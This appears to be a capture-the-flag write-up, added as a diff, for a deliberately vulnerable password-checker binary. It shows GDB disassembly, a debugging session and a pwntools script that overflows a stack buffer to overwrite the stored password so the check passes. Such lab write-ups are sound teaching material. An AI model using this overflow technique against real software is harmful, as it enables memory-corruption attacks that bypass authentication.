+| 0x00007ffe0cc901a8 (rsp+0x0798) | d0 12 c9 0c 03 00 00 00 | 0x000000030cc912d0 |
+| 0x00007ffe0cc901b0 (rsp+0x07a0) | e0 11 c9 0c fe 7f 00 00 | 0x00007ffe0cc911e0 |
+| 0x00007ffe0cc901b8 (rsp+0x07a8) | 1e e2 e7 9b cf 5c 00 00 | 0x00005ccf9be7e21e |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7ffe0cc8fa10, and our base pointer points to 0x7ffe0cc901b0.
+This means that we have (decimal) 246 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 1968 bytes.
+The input buffer begins at 0x7ffe0cc8fa40, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 54 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
 
+This challenge is a password checker that will check your input against a randomly generated password.
+The password is stored at 0x7ffe0cc90196, 1878 bytes after the start of your input buffer.
+We have disabled the following standard memory corruption mitigations for this challenge:
+- the canary is disabled, otherwise you would corrupt it before
+overwriting the return address, and the program would abort.
+Payload size: 
+```
+
+### Disassembly
+
+Let's open the program within GDB.
+
+```
+pwndbg> info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000001000  _init
+0x0000000000001110  __cxa_finalize@plt
+0x0000000000001120  putchar@plt
+0x0000000000001130  __errno_location@plt
+0x0000000000001140  puts@plt
+0x0000000000001150  write@plt
+0x0000000000001160  printf@plt
+0x0000000000001170  geteuid@plt
+0x0000000000001180  close@plt
+0x0000000000001190  read@plt
+0x00000000000011a0  strcmp@plt
+0x00000000000011b0  setvbuf@plt
+0x00000000000011c0  open@plt
+0x00000000000011d0  __isoc99_scanf@plt
+0x00000000000011e0  exit@plt
+0x00000000000011f0  strerror@plt
+0x0000000000001200  _start
+0x0000000000001230  deregister_tm_clones
+0x0000000000001260  register_tm_clones
+0x00000000000012a0  __do_global_dtors_aux
+0x00000000000012e0  frame_dummy
+0x00000000000012e9  DUMP_STACK
+0x00000000000014ec  bin_padding
+0x0000000000001c17  win
+0x0000000000001d1e  challenge
+0x0000000000002198  main
+0x0000000000002230  __libc_csu_init
+0x00000000000022a0  __libc_csu_fini
+0x00000000000022a8  _fini
+```
+
+### `challenge()`
+
+```
+pwndbg> disassemble challenge
+Dump of assembler code for function challenge:
+   0x0000000000001d1e <+0>:     endbr64
+   0x0000000000001d22 <+4>:     push   rbp
+   0x0000000000001d23 <+5>:     mov    rbp,rsp
+   0x0000000000001d26 <+8>:     sub    rsp,0x7a0
+   0x0000000000001d2d <+15>:    mov    DWORD PTR [rbp-0x784],edi
+   0x0000000000001d33 <+21>:    mov    QWORD PTR [rbp-0x790],rsi
+   0x0000000000001d3a <+28>:    mov    QWORD PTR [rbp-0x798],rdx
+   0x0000000000001d41 <+35>:    lea    rdx,[rbp-0x770]
+   0x0000000000001d48 <+42>:    mov    eax,0x0
+   0x0000000000001d4d <+47>:    mov    ecx,0xeb
+   0x0000000000001d52 <+52>:    mov    rdi,rdx
+   0x0000000000001d55 <+55>:    rep stos QWORD PTR es:[rdi],rax
+   0x0000000000001d58 <+58>:    mov    rdx,rdi
+   0x0000000000001d5b <+61>:    mov    DWORD PTR [rdx],eax
+   0x0000000000001d5d <+63>:    add    rdx,0x4
+   0x0000000000001d61 <+67>:    mov    WORD PTR [rdx],ax
+   0x0000000000001d64 <+70>:    add    rdx,0x2
+   0x0000000000001d68 <+74>:    mov    esi,0x0
+   0x0000000000001d6d <+79>:    lea    rdi,[rip+0x1480]        # 0x31f4
+   0x0000000000001d74 <+86>:    mov    eax,0x0
+   0x0000000000001d79 <+91>:    call   0x11c0 <open@plt>
+   0x0000000000001d7e <+96>:    mov    DWORD PTR [rbp-0x4],eax
+   0x0000000000001d81 <+99>:    lea    rax,[rbp-0x770]
+   0x0000000000001d88 <+106>:   lea    rcx,[rax+0x756]
+   0x0000000000001d8f <+113>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001d92 <+116>:   mov    edx,0x8
+   0x0000000000001d97 <+121>:   mov    rsi,rcx
+   0x0000000000001d9a <+124>:   mov    edi,eax
+   0x0000000000001d9c <+126>:   call   0x1190 <read@plt>
+   0x0000000000001da1 <+131>:   mov    eax,DWORD PTR [rbp-0x4]
+   0x0000000000001da4 <+134>:   mov    edi,eax
+   0x0000000000001da6 <+136>:   call   0x1180 <close@plt>
+   0x0000000000001dab <+141>:   mov    QWORD PTR [rbp-0x778],0x0
+   0x0000000000001db6 <+152>:   lea    rdi,[rip+0x144b]        # 0x3208
+   0x0000000000001dbd <+159>:   call   0x1140 <puts@plt>
+   0x0000000000001dc2 <+164>:   mov    rax,rsp
+   0x0000000000001dc5 <+167>:   mov    QWORD PTR [rip+0x33cc],rax        # 0x5198 <sp_>
+   0x0000000000001dcc <+174>:   mov    rax,rbp
+   0x0000000000001dcf <+177>:   mov    QWORD PTR [rip+0x33a2],rax        # 0x5178 <bp_>
+   0x0000000000001dd6 <+184>:   mov    rdx,QWORD PTR [rip+0x339b]        # 0x5178 <bp_>
+   0x0000000000001ddd <+191>:   mov    rax,QWORD PTR [rip+0x33b4]        # 0x5198 <sp_>
+   0x0000000000001de4 <+198>:   sub    rdx,rax
+   0x0000000000001de7 <+201>:   mov    rax,rdx
+   0x0000000000001dea <+204>:   shr    rax,0x3
+   0x0000000000001dee <+208>:   add    rax,0x2
+   0x0000000000001df2 <+212>:   mov    QWORD PTR [rip+0x338f],rax        # 0x5188 <sz_>
+   0x0000000000001df9 <+219>:   mov    rax,QWORD PTR [rip+0x3378]        # 0x5178 <bp_>
+   0x0000000000001e00 <+226>:   add    rax,0x8
+   0x0000000000001e04 <+230>:   mov    QWORD PTR [rip+0x3385],rax        # 0x5190 <rp_>
+   0x0000000000001e0b <+237>:   lea    rdi,[rip+0x142e]        # 0x3240
+   0x0000000000001e12 <+244>:   call   0x1140 <puts@plt>
+   0x0000000000001e17 <+249>:   mov    rdx,QWORD PTR [rip+0x336a]        # 0x5188 <sz_>
+   0x0000000000001e1e <+256>:   mov    rax,QWORD PTR [rip+0x3373]        # 0x5198 <sp_>
+   0x0000000000001e25 <+263>:   mov    rsi,rdx
+   0x0000000000001e28 <+266>:   mov    rdi,rax
+   0x0000000000001e2b <+269>:   call   0x12e9 <DUMP_STACK>
+   0x0000000000001e30 <+274>:   mov    rdx,QWORD PTR [rip+0x3341]        # 0x5178 <bp_>
+   0x0000000000001e37 <+281>:   mov    rax,QWORD PTR [rip+0x335a]        # 0x5198 <sp_>
+   0x0000000000001e3e <+288>:   mov    rsi,rax
+   0x0000000000001e41 <+291>:   lea    rdi,[rip+0x1440]        # 0x3288
+   0x0000000000001e48 <+298>:   mov    eax,0x0
+   0x0000000000001e4d <+303>:   call   0x1160 <printf@plt>
+   0x0000000000001e52 <+308>:   mov    rax,QWORD PTR [rip+0x332f]        # 0x5188 <sz_>
+   0x0000000000001e59 <+315>:   mov    rsi,rax
+   0x0000000000001e5c <+318>:   lea    rdi,[rip+0x146d]        # 0x32d0
+   0x0000000000001e63 <+325>:   mov    eax,0x0
+   0x0000000000001e68 <+330>:   call   0x1160 <printf@plt>
+   0x0000000000001e6d <+335>:   lea    rdi,[rip+0x14a4]        # 0x3318
+   0x0000000000001e74 <+342>:   call   0x1140 <puts@plt>
+   0x0000000000001e79 <+347>:   mov    rax,QWORD PTR [rip+0x3308]        # 0x5188 <sz_>
+   0x0000000000001e80 <+354>:   shl    rax,0x3
+   0x0000000000001e84 <+358>:   mov    rsi,rax
+   0x0000000000001e87 <+361>:   lea    rdi,[rip+0x14cf]        # 0x335d
+   0x0000000000001e8e <+368>:   mov    eax,0x0
+   0x0000000000001e93 <+373>:   call   0x1160 <printf@plt>
+   0x0000000000001e98 <+378>:   lea    rax,[rbp-0x770]
+   0x0000000000001e9f <+385>:   mov    rsi,rax
+   0x0000000000001ea2 <+388>:   lea    rdi,[rip+0x14cf]        # 0x3378
+   0x0000000000001ea9 <+395>:   mov    eax,0x0
+   0x0000000000001eae <+400>:   call   0x1160 <printf@plt>
+   0x0000000000001eb3 <+405>:   lea    rdi,[rip+0x1506]        # 0x33c0
+   0x0000000000001eba <+412>:   call   0x1140 <puts@plt>
+   0x0000000000001ebf <+417>:   lea    rdi,[rip+0x154a]        # 0x3410
+   0x0000000000001ec6 <+424>:   call   0x1140 <puts@plt>
+   0x0000000000001ecb <+429>:   mov    esi,0x36
+   0x0000000000001ed0 <+434>:   lea    rdi,[rip+0x1569]        # 0x3440
+   0x0000000000001ed7 <+441>:   mov    eax,0x0
+   0x0000000000001edc <+446>:   call   0x1160 <printf@plt>
+   0x0000000000001ee1 <+451>:   lea    rdi,[rip+0x15b0]        # 0x3498
+   0x0000000000001ee8 <+458>:   call   0x1140 <puts@plt>
+   0x0000000000001eed <+463>:   lea    rdi,[rip+0x15dc]        # 0x34d0
+   0x0000000000001ef4 <+470>:   call   0x1140 <puts@plt>
+   0x0000000000001ef9 <+475>:   lea    rax,[rbp-0x770]
+   0x0000000000001f00 <+482>:   add    rax,0x756
+   0x0000000000001f06 <+488>:   mov    edx,0x756
+   0x0000000000001f0b <+493>:   mov    rsi,rax
+   0x0000000000001f0e <+496>:   lea    rdi,[rip+0x1623]        # 0x3538
+   0x0000000000001f15 <+503>:   mov    eax,0x0
+   0x0000000000001f1a <+508>:   call   0x1160 <printf@plt>
+   0x0000000000001f1f <+513>:   lea    rdi,[rip+0x1662]        # 0x3588
+   0x0000000000001f26 <+520>:   call   0x1140 <puts@plt>
+   0x0000000000001f2b <+525>:   lea    rdi,[rip+0x16b6]        # 0x35e8
+   0x0000000000001f32 <+532>:   call   0x1140 <puts@plt>
+   0x0000000000001f37 <+537>:   lea    rdi,[rip+0x16ea]        # 0x3628
+   0x0000000000001f3e <+544>:   call   0x1140 <puts@plt>
+   0x0000000000001f43 <+549>:   lea    rdi,[rip+0x171b]        # 0x3665
+   0x0000000000001f4a <+556>:   mov    eax,0x0
+   0x0000000000001f4f <+561>:   call   0x1160 <printf@plt>
+   0x0000000000001f54 <+566>:   lea    rax,[rbp-0x778]
+   0x0000000000001f5b <+573>:   mov    rsi,rax
+   0x0000000000001f5e <+576>:   lea    rdi,[rip+0x170f]        # 0x3674
+   0x0000000000001f65 <+583>:   mov    eax,0x0
+   0x0000000000001f6a <+588>:   call   0x11d0 <__isoc99_scanf@plt>
+   0x0000000000001f6f <+593>:   mov    rax,QWORD PTR [rbp-0x778]
+   0x0000000000001f76 <+600>:   mov    rsi,rax
+   0x0000000000001f79 <+603>:   lea    rdi,[rip+0x16f8]        # 0x3678
+   0x0000000000001f80 <+610>:   mov    eax,0x0
+   0x0000000000001f85 <+615>:   call   0x1160 <printf@plt>
+   0x0000000000001f8a <+620>:   lea    rax,[rbp-0x770]
+   0x0000000000001f91 <+627>:   mov    rsi,rax
+   0x0000000000001f94 <+630>:   lea    rdi,[rip+0x170d]        # 0x36a8
+   0x0000000000001f9b <+637>:   mov    eax,0x0
+   0x0000000000001fa0 <+642>:   call   0x1160 <printf@plt>
+   0x0000000000001fa5 <+647>:   mov    rax,QWORD PTR [rbp-0x778]
+   0x0000000000001fac <+654>:   lea    rdx,[rax-0x36]
+   0x0000000000001fb0 <+658>:   lea    rcx,[rbp-0x770]
+   0x0000000000001fb7 <+665>:   mov    rax,QWORD PTR [rbp-0x778]
+   0x0000000000001fbe <+672>:   add    rax,rcx
+   0x0000000000001fc1 <+675>:   mov    rsi,rax
+   0x0000000000001fc4 <+678>:   lea    rdi,[rip+0x1725]        # 0x36f0
+   0x0000000000001fcb <+685>:   mov    eax,0x0
+   0x0000000000001fd0 <+690>:   call   0x1160 <printf@plt>
+   0x0000000000001fd5 <+695>:   mov    rax,QWORD PTR [rbp-0x778]
+   0x0000000000001fdc <+702>:   mov    rsi,rax
+   0x0000000000001fdf <+705>:   lea    rdi,[rip+0x1762]        # 0x3748
+   0x0000000000001fe6 <+712>:   mov    eax,0x0
+   0x0000000000001feb <+717>:   call   0x1160 <printf@plt>
+   0x0000000000001ff0 <+722>:   mov    rdx,QWORD PTR [rbp-0x778]
+   0x0000000000001ff7 <+729>:   lea    rax,[rbp-0x770]
+   0x0000000000001ffe <+736>:   mov    rsi,rax
+   0x0000000000002001 <+739>:   mov    edi,0x0
+   0x0000000000002006 <+744>:   call   0x1190 <read@plt>
+   0x000000000000200b <+749>:   mov    DWORD PTR [rbp-0x8],eax
+   0x000000000000200e <+752>:   cmp    DWORD PTR [rbp-0x8],0x0
+   0x0000000000002012 <+756>:   jns    0x2040 <challenge+802>
+   0x0000000000002014 <+758>:   call   0x1130 <__errno_location@plt>
+   0x0000000000002019 <+763>:   mov    eax,DWORD PTR [rax]
+   0x000000000000201b <+765>:   mov    edi,eax
+   0x000000000000201d <+767>:   call   0x11f0 <strerror@plt>
+   0x0000000000002022 <+772>:   mov    rsi,rax
+   0x0000000000002025 <+775>:   lea    rdi,[rip+0x1744]        # 0x3770
+   0x000000000000202c <+782>:   mov    eax,0x0
+   0x0000000000002031 <+787>:   call   0x1160 <printf@plt>
+   0x0000000000002036 <+792>:   mov    edi,0x1
+   0x000000000000203b <+797>:   call   0x11e0 <exit@plt>
+   0x0000000000002040 <+802>:   mov    eax,DWORD PTR [rbp-0x8]
+   0x0000000000002043 <+805>:   mov    esi,eax
+   0x0000000000002045 <+807>:   lea    rdi,[rip+0x1748]        # 0x3794
+   0x000000000000204c <+814>:   mov    eax,0x0
+   0x0000000000002051 <+819>:   call   0x1160 <printf@plt>
+   0x0000000000002056 <+824>:   lea    rdi,[rip+0x174b]        # 0x37a8
+   0x000000000000205d <+831>:   call   0x1140 <puts@plt>
+   0x0000000000002062 <+836>:   mov    rdx,QWORD PTR [rip+0x311f]        # 0x5188 <sz_>
+   0x0000000000002069 <+843>:   mov    rax,QWORD PTR [rip+0x3128]        # 0x5198 <sp_>
+   0x0000000000002070 <+850>:   mov    rsi,rdx
+   0x0000000000002073 <+853>:   mov    rdi,rax
+   0x0000000000002076 <+856>:   call   0x12e9 <DUMP_STACK>
+   0x000000000000207b <+861>:   lea    rdi,[rip+0x174f]        # 0x37d1
+   0x0000000000002082 <+868>:   call   0x1140 <puts@plt>
+   0x0000000000002087 <+873>:   lea    rax,[rbp-0x770]
+   0x000000000000208e <+880>:   mov    rsi,rax
+   0x0000000000002091 <+883>:   lea    rdi,[rip+0x1758]        # 0x37f0
+   0x0000000000002098 <+890>:   mov    eax,0x0
+   0x000000000000209d <+895>:   call   0x1160 <printf@plt>
+   0x00000000000020a2 <+900>:   lea    rax,[rbp-0x770]
+   0x00000000000020a9 <+907>:   add    rax,0x756
+   0x00000000000020af <+913>:   mov    rsi,rax
+   0x00000000000020b2 <+916>:   lea    rdi,[rip+0x175f]        # 0x3818
+   0x00000000000020b9 <+923>:   mov    eax,0x0
+   0x00000000000020be <+928>:   call   0x1160 <printf@plt>
+   0x00000000000020c3 <+933>:   mov    edi,0xa
+   0x00000000000020c8 <+938>:   call   0x1120 <putchar@plt>
+   0x00000000000020cd <+943>:   mov    eax,DWORD PTR [rbp-0x8]
+   0x00000000000020d0 <+946>:   movsxd rdx,eax
+   0x00000000000020d3 <+949>:   lea    rax,[rbp-0x770]
+   0x00000000000020da <+956>:   add    rdx,rax
+   0x00000000000020dd <+959>:   mov    rax,QWORD PTR [rip+0x30ac]        # 0x5190 <rp_>
+   0x00000000000020e4 <+966>:   add    rax,0x2
+   0x00000000000020e8 <+970>:   cmp    rdx,rax
+   0x00000000000020eb <+973>:   jbe    0x2129 <challenge+1035>
+   0x00000000000020ed <+975>:   lea    rdi,[rip+0x174c]        # 0x3840
+   0x00000000000020f4 <+982>:   call   0x1140 <puts@plt>
+   0x00000000000020f9 <+987>:   lea    rdi,[rip+0x1798]        # 0x3898
+   0x0000000000002100 <+994>:   call   0x1140 <puts@plt>
+   0x0000000000002105 <+999>:   lea    rdi,[rip+0x17dc]        # 0x38e8
+   0x000000000000210c <+1006>:  call   0x1140 <puts@plt>
+   0x0000000000002111 <+1011>:  lea    rdi,[rip+0x1818]        # 0x3930
+   0x0000000000002118 <+1018>:  call   0x1140 <puts@plt>
+   0x000000000000211d <+1023>:  lea    rdi,[rip+0x1851]        # 0x3975
+   0x0000000000002124 <+1030>:  call   0x1140 <puts@plt>
+   0x0000000000002129 <+1035>:  lea    rdi,[rip+0x184f]        # 0x397f
+   0x0000000000002130 <+1042>:  call   0x1140 <puts@plt>
+   0x0000000000002135 <+1047>:  lea    rax,[rbp-0x770]
+   0x000000000000213c <+1054>:  lea    rdx,[rax+0x756]
+   0x0000000000002143 <+1061>:  lea    rax,[rbp-0x770]
+   0x000000000000214a <+1068>:  mov    rsi,rdx
+   0x000000000000214d <+1071>:  mov    rdi,rax
+   0x0000000000002150 <+1074>:  call   0x11a0 <strcmp@plt>
+   0x0000000000002155 <+1079>:  test   eax,eax
+   0x0000000000002157 <+1081>:  je     0x216f <challenge+1105>
+   0x0000000000002159 <+1083>:  lea    rdi,[rip+0x1838]        # 0x3998
+   0x0000000000002160 <+1090>:  call   0x1140 <puts@plt>
+   0x0000000000002165 <+1095>:  mov    edi,0x1
+   0x000000000000216a <+1100>:  call   0x11e0 <exit@plt>
+   0x000000000000216f <+1105>:  lea    rdi,[rip+0x1842]        # 0x39b8
+   0x0000000000002176 <+1112>:  call   0x1140 <puts@plt>
+   0x000000000000217b <+1117>:  mov    eax,0x0
+   0x0000000000002180 <+1122>:  call   0x1c17 <win>
+   0x0000000000002185 <+1127>:  lea    rdi,[rip+0x1843]        # 0x39cf
+   0x000000000000218c <+1134>:  call   0x1140 <puts@plt>
+   0x0000000000002191 <+1139>:  mov    eax,0x0
+   0x0000000000002196 <+1144>:  leave
+   0x0000000000002197 <+1145>:  ret
+End of assembler dump.
+```
+
+We can see that the `challenge()` function calls `strcmp@plt` to comare two strings pointed to by the `rsi` and `rdi` registers.
+This is the password verification mechanism.
+If the strings are identical, the reault which is in `rax` is `0`.
+
+After using `test` to check if `rax=0`, the program jumps to `challenge+1105` if the condition is met, and calls `win()`. Else, it exits.
+
+Let's set a breakpoint at `challenge+1074`, right before the call to `strcmp@plt` is made.
+
+```
+pwndbg> break *(challenge+1074)
+Breakpoint 1 at 0x2150
+```
+
+```
+pwndbg> run
+Starting program: /challenge/login-leakage-easy 
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
+
+# --- snip ---
+
+Our stack pointer points to 0x7ffc037530b0, and our base pointer points to 0x7ffc03753850.
+This means that we have (decimal) 246 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 1968 bytes.
+The input buffer begins at 0x7ffc037530e0, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 54 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+This challenge is a password checker that will check your input against a randomly generated password.
+The password is stored at 0x7ffc03753836, 1878 bytes after the start of your input buffer.
+We have disabled the following standard memory corruption mitigations for this challenge:
+- the canary is disabled, otherwise you would corrupt it before
+overwriting the return address, and the program would abort.
+Payload size: 8
+You have chosen to send 8 bytes of input!
+This will allow you to write from 0x7ffc037530e0 (the start of the input buffer)
+right up to (but not including) 0x7ffc037530e8 (which is -46 bytes beyond the end of the buffer).
+Send your payload (up to 8 bytes)!
+abcdefgh
+You sent 8 bytes!
+Let's see what happened with the stack:
+
+# --- snip ---
+
+The program's memory status:
+- the input buffer starts at 0x7ffc037530e0
+- the password buffer starts at 0x7ffc03753836
+
+Checking Password...
+
+Breakpoint 1, 0x000057752c9ab150 in challenge ()
+LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
+─────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
+ RAX  0x7ffc037530e0 ◂— 'abcdefgh'
+ RBX  0x57752c9ab230 (__libc_csu_init) ◂— endbr64 
+ RCX  0x7f89c7262297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
+ RDX  0x7ffc03753836 ◂— 0xc60d8289afdd2cca
+ RDI  0x7ffc037530e0 ◂— 'abcdefgh'
+ RSI  0x7ffc03753836 ◂— 0xc60d8289afdd2cca
+ R8   0x15
+ R9   0x2f
+ R10  0x57752c9ac83a ◂— 0x415700000000000a /* '\n' */
+ R11  0x246
+ R12  0x57752c9aa200 (_start) ◂— endbr64 
+ R13  0x7ffc03754970 ◂— 1
+ R14  0
+ R15  0
+ RBP  0x7ffc03753850 —▸ 0x7ffc03754880 ◂— 0
+ RSP  0x7ffc037530b0 ◂— 0
+ RIP  0x57752c9ab150 (challenge+1074) ◂— call strcmp@plt
+──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
+ ► 0x57752c9ab150 <challenge+1074>    call   strcmp@plt                  <strcmp@plt>
+        s1: 0x7ffc037530e0 ◂— 'abcdefgh'
+        s2: 0x7ffc03753836 ◂— 0xc60d8289afdd2cca
+ 
+   0x57752c9ab155 <challenge+1079>    test   eax, eax
+   0x57752c9ab157 <challenge+1081>    je     challenge+1105              <challenge+1105>
+ 
+   0x57752c9ab159 <challenge+1083>    lea    rdi, [rip + 0x1838]     RDI => 0x57752c9ac998 ◂— 'Password check failed! Exiting!'
+   0x57752c9ab160 <challenge+1090>    call   puts@plt                    <puts@plt>
+ 
+   0x57752c9ab165 <challenge+1095>    mov    edi, 1                  EDI => 1
+   0x57752c9ab16a <challenge+1100>    call   exit@plt                    <exit@plt>
+ 
+   0x57752c9ab16f <challenge+1105>    lea    rdi, [rip + 0x1842]     RDI => 0x57752c9ac9b8 ◂— 'Password check passed!'
+   0x57752c9ab176 <challenge+1112>    call   puts@plt                    <puts@plt>
+ 
+   0x57752c9ab17b <challenge+1117>    mov    eax, 0                  EAX => 0
+   0x57752c9ab180 <challenge+1122>    call   win                         <win>
+───────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
+00:0000│ rsp     0x7ffc037530b0 ◂— 0
+01:0008│-798     0x7ffc037530b8 —▸ 0x7ffc03754988 —▸ 0x7ffc03756698 ◂— 'SHELL=/run/dojo/bin/bash'
+02:0010│-790     0x7ffc037530c0 —▸ 0x7ffc03754978 —▸ 0x7ffc0375667a ◂— '/challenge/login-leakage-easy'
+03:0018│-788     0x7ffc037530c8 ◂— 0x100000000
+04:0020│-780     0x7ffc037530d0 ◂— 0
+05:0028│-778     0x7ffc037530d8 ◂— 8
+06:0030│ rax rdi 0x7ffc037530e0 ◂— 'abcdefgh'
+07:0038│-768     0x7ffc037530e8 ◂— 0
+─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
+ ► 0   0x57752c9ab150 challenge+1074
+   1   0x57752c9ab21e main+134
+   2   0x7f89c7178083 __libc_start_main+243
+   3   0x57752c9aa22e _start+46
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+We can see that the program compares the first bytes of our payload to the saved password. Ideally, it would compare the saved password with some random number.
+
+Since, we control the first 8 bytes of our payload that we write into the buffer, and the challenge also tells us the address of the buffer and the stored address, we can easily set both values to the same string.
+
+That way, the check will succeed and the challenge will call `win()` for us.
+
+### Exploit
+
+```py
+from pwn import *
+
+p = process('/challenge/login-leakage-easy')
+
+# Initialize values
+buffer_addr = 0x7fffaef3f4c0
+password_addr = 0x7fffaef3fc16
+addr_of_saved_bp = 0x7ffe2e4a66a0
+password = 0xdeadbeefcafebabe
+
+# Calculate offset & bytes_to_read
+offset = password_addr - buffer_addr
+bytes_to_read = offset + 8
+
+# Build payload
+payload = p64(password)
+payload += b"\00"
+payload += b"A" * (offset - (8 + 1))
+payload += p64(password)
+
+# Send number of bytes
+p.recvuntil(b'Payload size: ')
+p.sendline(str(bytes_to_read))
+
+# Send payload
+p.recvuntil(b'Send your payload')
+p.send(payload)
+
+p.interactive() 
 ```
